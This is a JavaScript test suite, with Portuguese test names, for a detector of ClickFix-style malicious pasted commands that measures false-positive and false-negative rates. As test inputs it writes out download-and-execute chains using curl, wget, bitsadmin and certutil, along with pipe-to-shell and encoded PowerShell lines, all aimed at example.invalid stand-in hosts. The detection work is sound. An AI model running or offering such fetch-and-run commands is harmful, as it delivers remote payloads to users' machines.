import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { classify } from "../src/classifier.js";
import { benign, maliciousSimulated } from "./fixtures.js";

const realClickFixSamples = JSON.parse(
  await readFile(new URL("./corpus/real-sim.json", import.meta.url), "utf8")
);
const similarBenignSamples = JSON.parse(
  await readFile(new URL("./corpus/dev-benign.json", import.meta.url), "utf8")
).filter(({ category }) => category.startsWith("clickfix-benign-"));
const fullBenignCorpus = JSON.parse(
  await readFile(new URL("./corpus/benign.json", import.meta.url), "utf8")
);
const fullSimulatedCorpus = JSON.parse(
  await readFile(new URL("./corpus/malicious-sim.json", import.meta.url), "utf8")
);
const regressionSets = await Promise.all([
  "dev-benign.json",
  "dev-malicious-sim.json",
  "holdout-benign.json",
  "holdout-malicious-sim.json",
  "real-sim.json"
].map(async (filename) => JSON.parse(await readFile(
  new URL(`./corpus/${filename}`, import.meta.url),
  "utf8"
))));

test("classifica todos os exemplos simulados como ao menos low", () => {
  const results = maliciousSimulated.map((text) => classify(text));
  assert.ok(results.every((result) => result.level === "low" || result.level === "high"));
  const high = results.filter((result) => result.level === "high").length;
  assert.ok(high > results.length / 2, `${high}/${results.length} devem ser high`);
});

test("comandos e textos benignos da documentação não geram alertas", () => {
  const results = benign.map((text) => classify(text));
  assert.ok(results.every((result) => result.level === "none"));
});

test("limita textos menores que 20 caracteres a no máximo low", () => {
  for (const value of ["mshta x", "cmd /c echo x", "bash -c x"]) {
    assert.notEqual(classify(value).level, "high", value);
  }
});

test("contexto apenas aumenta score e não cria detecção sozinho", () => {
  const text = "texto completamente comum";
  const plain = classify(text);
  const contextual = classify(text, {
    fullscreen: true,
    crossOriginIframe: true,
    msSinceClick: 100
  });
  assert.equal(plain.level, "none");
  assert.equal(contextual.level, "none");
  assert.equal(contextual.score, plain.score);

  const command = "cmd /c echo test && calc";
  const withoutContext = classify(command);
  const withContext = classify(command, {
    fullscreen: true,
    crossOriginIframe: true,
    msSinceClick: 100
  });
  assert.ok(withContext.score > withoutContext.score);
});

test("retorna razões legíveis e trata entradas inválidas como texto vazio", () => {
  const result = classify("curl https://example.invalid | bash");
  assert.ok(result.reasons.includes("curl/wget para shell"));
  assert.ok(result.reasons.includes("encadeamento |"));
  assert.deepEqual(classify(null), { score: 0, level: "none", reasons: [] });
});

test("evita alertas de documentação e pipes de instaladores sem sinais corroborantes", () => {
  assert.equal(classify("https://docs.example.com/powershell/").level, "none");
  assert.equal(classify("curl -fsSL https://get.example.invalid/install | sh").level, "none");
  assert.equal(
    classify("curl https://example.invalid/a | sh && echo done").level,
    "high"
  );
});

test("corpora completos mantêm 0 FP em 175 benignos e 79/79 simulados", () => {
  const falsePositives = fullBenignCorpus.filter(({ text }) => classify(text).level !== "none");
  const detections = fullSimulatedCorpus.filter(({ text }) => classify(text).level !== "none");
  assert.equal(fullBenignCorpus.length, 175);
  assert.equal(fullSimulatedCorpus.length, 79);
  console.log(
    `Corpora completos: benignos ${fullBenignCorpus.length - falsePositives.length}/${fullBenignCorpus.length} sem alertas; ` +
    `simulados ${detections.length}/${fullSimulatedCorpus.length} detectados`
  );
  assert.equal(falsePositives.length, 0, JSON.stringify(falsePositives.map(({ category }) => category)));
  assert.ok(detections.length >= 79, `${detections.length}/79 abaixo da detecção anterior 79/79`);
});

test("reconhece concatenação, homógrafos, comandos multilinha e COMSPEC sem alertar texto comum", () => {
  for (const text of [
    "'po'+'wer'+'shell' -Command 'echo ok'",
    "p\u043ewershell -Command 'echo ok'",
    "powershell\n.exe -Command 'echo ok'",
    "%COMSPEC:~-7,3% /c echo calc"
  ]) {
    assert.notEqual(classify(text).level, "none", text);
  }
  assert.equal(classify("Русский текст о консоли в документации").level, "none");
});

test("classifica combinações ClickFix cmd neutralizadas sem depender de uma string literal", () => {
  for (const { text, notes } of realClickFixSamples) {
    const result = classify(text);
    assert.equal(result.level, "high", `${notes}: ${result.level}`);
    assert.ok(result.reasons.includes("download em diretório gravável + execução indireta"), notes);
  }

  const decimalHost = classify(realClickFixSamples[0].text.replaceAll("example.invalid", "2130706433"));
  const hexadecimalHost = classify(realClickFixSamples[0].text.replaceAll("example.invalid", "0x7f000001"));
  assert.ok(decimalHost.reasons.includes("host numérico sem esquema"));
  assert.ok(hexadecimalHost.reasons.includes("host numérico sem esquema"));
});

test("reconhece combinações de wget, bitsadmin e certutil com execução indireta", () => {
  const variants = [
    "wget -O %TEMP%\\a.txt example.invalid/1 && for /f \"delims=\" %i in (%TEMP%\\a.txt) do %i",
    "bitsadmin /transfer job example.invalid/1 %APPDATA%\\a.cmd & call %APPDATA%\\a.cmd",
    "certutil -urlcache -f example.invalid/1 %LOCALAPPDATA%\\Downloads\\a.txt && type %LOCALAPPDATA%\\Downloads\\a.txt | cmd"
  ];
  for (const text of variants) {
    assert.equal(classify(text).level, "high", text);
  }
});

test("usa o primeiro token apenas quando há outro sinal de risco", () => {
  const alone = classify("powershell");
  assert.ok(!alone.reasons.some((reason) => reason.startsWith("primeiro token de comando")));

  const corroborated = classify("cmd /c echo test && calc");
  assert.ok(corroborated.reasons.includes("primeiro token de comando (cmd)"));
});

test("reconhece os interpretadores e binários ClickFix no primeiro token", () => {
  const commands = [
    "cmd /c", "powershell", "pwsh", "mshta", "wscript", "cscript",
    "rundll32", "regsvr32", "certutil", "bitsadmin", "curl", "wget",
    "bash -c", "sh"
  ];
  for (const command of commands) {
    const token = command.split(" ")[0];
    const result = classify(`${command} https://example.invalid/a && echo done`);
    assert.ok(
      result.reasons.includes(`primeiro token de comando (${token})`),
      `${command} não foi reconhecido no primeiro token`
    );
    assert.ok(!classify(token).reasons.includes(`primeiro token de comando (${token})`));
  }
});

test("normaliza prefixos e ignora set, echo, cd e comentários ao achar o comando", () => {
  const decoyPrefix = classify(
    'set "MODE=docs" & echo ready & cd %TEMP% & curl.exe -o %TEMP%\\a.txt https://example.invalid/a && for /f "delims=" %i in (a.txt) do %i'
  );
  assert.ok(decoyPrefix.reasons.includes("primeiro token de comando (curl)"));

  const quotedPrefix = classify('  @& "cmd"   /c   echo test && calc');
  assert.ok(quotedPrefix.reasons.includes("primeiro token de comando (cmd)"));

  const commentPrefix = classify("REM comentário\n@&powershell -enc QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=");
  assert.ok(commentPrefix.reasons.includes("primeiro token de comando (powershell)"));
});

test("não rebaixa níveis por abertura natural ou JSON quando há comando de shell", () => {
  const prose = classify("Please review the PowerShell documentation at https://docs.example.com/powershell/");
  assert.equal(prose.level, "high");

  const json = classify('{"example":"powershell"}');
  assert.equal(json.level, "high");

  const strong = classify("Please check this: powershell -enc QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=");
  assert.equal(strong.level, "high");

  assert.equal(classify("Please review this documentation.").level, "none");
  assert.equal(classify("https://docs.example.com/powershell/").level, "none");
  assert.equal(classify("const message = 'hello'; const ready = true;").level, "none");
});

test("mantém FP/FN nos limites do baseline em dev, holdout e real-sim", () => {
  const [devBenign, devMalicious, holdoutBenign, holdoutMalicious, realSim] = regressionSets;
  const count = (samples, predicate) => samples.filter(predicate).length;
  const devFp = count(devBenign, ({ text }) => classify(text).level !== "none");
  const devFn = count(devMalicious, ({ text }) => classify(text).level === "none");
  const holdoutFp = count(holdoutBenign, ({ text }) => classify(text).level !== "none");
  const holdoutFn = count(holdoutMalicious, ({ text }) => classify(text).level === "none");
  const realFn = count(realSim, ({ text }) => classify(text).level === "none");

  assert.equal(devBenign.length, 140);
  assert.equal(devMalicious.length, 56);
  assert.equal(holdoutBenign.length, 50);
  assert.equal(holdoutMalicious.length, 23);
  assert.equal(classify(devMalicious[12].text).level, "high", "dev malicious #13 caiu abaixo de high");
  assert.equal(classify(devMalicious[19].text).level, "high", "dev malicious #20 caiu abaixo de high");
  assert.ok(devFp <= 6, `dev FP ${devFp}/140 excedeu o baseline 6/140`);
  assert.ok(devFn <= 0, `dev FN ${devFn}/56 excedeu o baseline 0/56`);
  assert.ok(holdoutFp <= 2, `holdout FP ${holdoutFp}/50 excedeu o baseline 2/50`);
  assert.ok(holdoutFn <= 0, `holdout FN ${holdoutFn}/23 excedeu o baseline 0/23`);
  assert.ok(realFn <= 0, `real-sim FN ${realFn}/${realSim.length} excedeu o baseline 0/${realSim.length}`);
});

test("não pontua isoladamente download, execução indireta, cadeia cmd ou host numérico", () => {
  for (const text of [
    "curl.exe -o %tmp%\\notes.txt example.invalid/notes",
    "for /f \"delims=\" %i in (notes.txt) do %i",
    "set MODE=docs && echo ready",
    "2130706433/notes",
    "0x7f000001/notes",
    "certutil -hashfile README.md SHA256"
  ]) {
    assert.equal(classify(text).level, "none", text);
  }
});

test("15 exemplos benignos semelhantes permanecem sem alerta", () => {
  assert.equal(similarBenignSamples.length, 15);
  for (const { text } of similarBenignSamples) {
    assert.equal(classify(text).level, "none", text);
  }
});

test("classifica apenas as extremidades de textos acima de 100 KiB", () => {
  const size = 120 * 1024;
  const middleOnly = `${"ordinary text ".repeat(4400)}cmd /c echo test${" ordinary text".repeat(4400)}`;
  assert.ok(middleOnly.length > size);
  assert.equal(classify(middleOnly).level, "none");

  const tail = `${"ordinary text ".repeat(4400)}${" ordinary text".repeat(4400)} cmd /c echo test`;
  assert.ok(tail.length > size);
  assert.notEqual(classify(tail).level, "none");
});

test("imprime taxas de falsos positivos e falsos negativos", () => {
  const falsePositives = benign.filter((text) => classify(text).level !== "none").length;
  const falseNegatives = maliciousSimulated.filter((text) => classify(text).level === "none").length;
  const fpRate = (falsePositives / benign.length) * 100;
  const fnRate = (falseNegatives / maliciousSimulated.length) * 100;
  console.log(`Taxa de falsos positivos: ${fpRate.toFixed(1)}% (${falsePositives}/${benign.length})`);
  console.log(`Taxa de falsos negativos: ${fnRate.toFixed(1)}% (${falseNegatives}/${maliciousSimulated.length})`);
  assert.equal(falsePositives, 0);
  assert.equal(falseNegatives, 0);
});
